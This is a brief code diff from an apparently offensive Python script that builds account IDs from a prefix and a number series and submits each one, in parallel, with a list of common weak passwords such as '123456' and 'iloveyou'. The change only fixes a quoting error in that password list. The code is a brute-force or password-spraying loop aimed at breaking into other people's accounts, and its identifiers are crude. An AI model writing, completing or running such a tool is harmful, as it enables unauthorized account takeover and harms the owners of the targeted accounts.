@@ -108,7 +108,7 @@ def fuckMyxmosabbirold(series):
         print("-------------------------------")
         for love in gen:
             ids = SEX + love
-            passlist = ["123456", "1234567", "12345678", "123456789","Bangladesh","1234567890","iloveyou","]
+            passlist = ["123456", "1234567", "12345678", "123456789","Bangladesh","1234567890","iloveyou"]
             Fuck_xnxx.submit(Fucking_life, ids, passlist)
     sys.exit("\n-------------------------------")
     
